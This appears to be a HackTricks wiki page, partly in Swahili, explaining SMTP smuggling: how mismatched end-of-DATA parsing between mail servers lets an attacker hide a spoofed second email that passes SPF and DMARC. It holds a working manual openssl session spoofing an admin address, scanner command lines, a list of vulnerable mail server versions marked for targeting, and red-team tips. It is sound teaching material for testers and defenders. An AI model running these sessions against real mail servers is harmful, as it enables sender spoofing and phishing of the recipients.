# SMTP Smuggling

{{#include ../../banners/hacktricks-training.md}}

## Taarifa za Msingi

Aina hii ya udhaifu iligunduliwa [**awali katika chapisho hiki**](https://sec-consult.com/blog/detail/smtp-smuggling-spoofing-e-mails-worldwide/) ambapo inafafanuliwa kuwa inawezekana **kutumia utofauti katika jinsi protocol ya SMTP inavyotafsiriwa** wakati wa kumalizia barua pepe, kuruhusu mshambuliaji kuficha barua pepe zaidi ndani ya mwili wa ile halali, na hivyo kuiga watumiaji wengine wa domain iliyoharibika (kwa mfano admin@outlook.com) na kuzipita kinga kama SPF.

### Kwanini

Hii ni kwa sababu katika protocol ya SMTP, **data ya ujumbe** wa barua pepe unaotumwa inaongozwa na mtumiaji (mshambuliaji) ambaye anaweza kutuma data iliyotengenezwa mahsusi akitumia tofauti za wapangaji (parsers) ambazo zitaingiza barua pepe za ziada kwa mpokeaji. Angalia mfano uliopigwa picha kutoka chapisho la asili:

<figure><img src="../../images/image (8) (1) (1) (1) (1).png" alt=""><figcaption><p><a href="https://sec-consult.com/fileadmin/user_upload/sec-consult/Dynamisch/Blogartikel/2023_12/SMTP_Smuggling-Overview__09_.png">https://sec-consult.com/fileadmin/user_upload/sec-consult/Dynamisch/Blogartikel/2023_12/SMTP_Smuggling-Overview__09_.png</a></p></figcaption></figure>

### Jinsi

Ili kutumia udhaifu huu mshambuliaji anahitaji kutuma data ambayo **Outbound SMTP server** inaona kuwa ni barua pepe 1 tu lakini **Inbound SMTP server** inaona kuwa kuna barua pepe kadhaa.

Watafiti waligundua kuwa server tofauti za **Inbound** huchukulia wahusika tofauti kama mwisho wa data ya ujumbe wa barua pepe ambayo server za Outbound hazichukuli. Kwa mfano, mwisho wa kawaida wa data ni `\r\n.\r`. Lakini ikiwa Inbound SMTP server pia inasaidia `\n.`, mshambuliaji anaweza kuongeza **data hiyo ndani ya barua pepe yake na kuanza kuonyesha amri za SMTP** za ujumbe mpya ili kuificha, kama ilivyo kwenye picha hapo juu.

Bila shaka, hii itafanya kazi tu ikiwa **Outbound SMTP server haitatenda pia data hii** kama mwisho wa data ya ujumbe, kwa sababu kwa wakati huo itatazama barua 2 badala ya 1, hivyo basi ni kutofautiana kwa usawazishaji (desynchronization) kinachotumiwa kwenye udhaifu huu.

Data zinazoweza kusababisha kutofautiana:

- `\n.`
- `\n.\r`

Pia kumbuka kuwa SPF inapitwa kwa sababu ikiwa unasmuggle barua kutoka `admin@outlook.com` kutoka kwa barua ya `user@outlook.com`, **mtumaji bado ni `outlook.com`.**

---

## Orodha ya mshambuliaji (ni masharti gani yanayopaswa kutimizwa?)

Ili kufanikiwa kuficha barua pepe ya pili, kwa kawaida unahitaji:

- Server ya outbound A kupitia ambayo unaweza kutuma (mara nyingi kwa creds halali) ambayo itapitisha mfuatano wa mwisho‑wa‑DATA usio wa kawaida bila kubadilishwa. Huduma nyingi kihistoria zilikuwa zikituma tofautisho kama `\n.\r\n` au `\n.\n`.
- Server ya kupokea B itakayetafsiri mfuatano huo usio wa kawaida kama mwisho‑wa‑DATA kisha kufasiri chochote kinachofuata kama amri mpya za SMTP (MAIL/RCPT/DATA...).
- Outbound lazima itume kwa kutumia `DATA` (si `BDAT`). Ikiwa A inaunga mkono CHUNKING/BDAT, smuggling inafanya kazi tu ikiwa itarudi kwa DATA (mfano, B haisemi inaunga mkono CHUNKING), vinginevyo BDAT inayopimwa kwa urefu huzuia kuchanganyikiwa.
- PIPELINING haibidi lakini husaidia kuficha amri zilizowekwa ndani ya TCP write moja ili vifaa vya kati visiresynchronize.

Tofauti za kawaida za mwisho‑wa‑DATA zinazostahili kujaribiwa (zinategemea mpokeaji):

- `\n.\n`
- `\n.\r\n`
- `\r.\r\n`
- `\r\n.\r` (bare CR at end)

Kumbuka: Kinachofanya kazi ni mkusanyiko wa “kile A kinapitisha” ∩ “kile B kinakubali”.

---

## Mfano wa eksploit kwa mkono (kikao kimoja)

Ifuatayo inaonyesha wazo kwa kutumia kikao cha raw STARTTLS SMTP. Baada ya block ya kwanza ya DATA tunaingiza terminator usio wa kawaida, kisha mazungumzo mengine ya SMTP ambayo server ya mpokeaji inaweza kuchukulia kama ujumbe mpya.

<details>
<summary>Manual smuggling session (STARTTLS)</summary>
```
$ openssl s_client -starttls smtp -crlf -connect smtp.example.com:587
EHLO a.example
AUTH PLAIN <base64(\0user@example.com\0password)>
MAIL FROM:<user@example.com>
RCPT TO:<victim@target.com>
DATA
From: User <user@example.com>
To: victim <victim@target.com>
Subject: legit

hello A
\n.\r\nMAIL FROM:<admin@target.com>
RCPT TO:<victim@target.com>
DATA
From: Admin <admin@target.com>
To: victim <victim@target.com>
Subject: smuggled

hello B
\r\n.\r\n
```
If A forwards `\n.\r\n` and B accepts it as end‑of‑DATA, message “hello B” may be accepted as a second email from `admin@target.com` while passing SPF (aligned with A’s IPs).
</details>

Tip: When testing interactively, ensure `-crlf` is used so OpenSSL preserves CRLF in what you type.

---

## Automation and scanners

- hannob/smtpsmug: send a message ending with multiple malformed end‑of‑DATA sequences to see what a receiver accepts.
- Example: `./smtpsmug -s mail.target.com -p 25 -t victim@target.com`
- The‑Login/SMTP‑Smuggling‑Tools: scanner for both inbound and outbound sides plus an analysis SMTP server to see exactly which sequences survive a sender.
- Inbound quick check: `python3 smtp_smuggling_scanner.py victim@target.com`
- Outbound via a relay: `python3 smtp_smuggling_scanner.py YOUR@ANALYSIS.DOMAIN --outbound-smtp-server smtp.relay.com --port 587 --starttls --sender-address you@relay.com --username you@relay.com --password '...'
`

These tools help you map the A→B pairs where smuggling actually works.

---

## CHUNKING/BDAT vs DATA

- DATA uses a sentinel terminator `<CR><LF>.<CR><LF>`; any ambiguity in how CR/LF are normalized or dot‑stuffed leads to desync.
- CHUNKING (BDAT) frames the body with an exact byte length and therefore prevents classic smuggling. However, if the sender falls back to DATA (because the receiver doesn’t advertise CHUNKING), classic smuggling becomes possible again.

---

## Notes on affected software and fixes (for targeting)

- Postfix: prior to 3.9 the default tolerated bare LFs; from 3.5.23/3.6.13/3.7.9/3.8.4 admins can enable `smtpd_forbid_bare_newline`. Current recommendation is `smtpd_forbid_bare_newline = normalize` (3.8.5+/3.7.10+/3.6.14+/3.5.24+) or set to `reject` for strict RFC enforcement.
- Exim: fixed in 4.97.1 (and later) for variants relying on mixed end‑of‑DATA sequences when DATA is used. Older 4.97/4.96 may be exploitable depending on PIPELINING/CHUNKING.
- Sendmail: fixed in 8.18; older 8.17.x accepted some non‑standard terminators.
- Various libraries/servers (e.g., aiosmtpd before 1.4.5, some vendor gateways, and specific SaaS relays) had similar issues; modern versions tend to accept DATA only with strict `<CR><LF>.<CR><LF>`.

Use the scanners above to verify current behavior; many vendors changed defaults in early 2024–2025.

---

## Tips for red team ops

- Favor large commodity senders for A (historically Exchange Online, shared hosters, etc.). If they still forward some non‑standard EOM and they’re in the victim’s SPF, your smuggled MAIL FROM will inherit their reputation.
- Enumerate B’s SMTP extensions: `EHLO` banner for PIPELINING/CHUNKING; if CHUNKING is missing you have a better chance from BDAT‑first senders. Combine with malformed EOMs to probe acceptance.
- Watch headers: the smuggled message will usually create a separate Received chain starting at B. DMARC will often pass because MAIL FROM aligns with A’s IP space.

---

## **References**

- [https://sec-consult.com/blog/detail/smtp-smuggling-spoofing-e-mails-worldwide/](https://sec-consult.com/blog/detail/smtp-smuggling-spoofing-e-mails-worldwide/)
- [https://www.postfix.org/smtp-smuggling.html](https://www.postfix.org/smtp-smuggling.html)

{{#include ../../banners/hacktricks-training.md}}
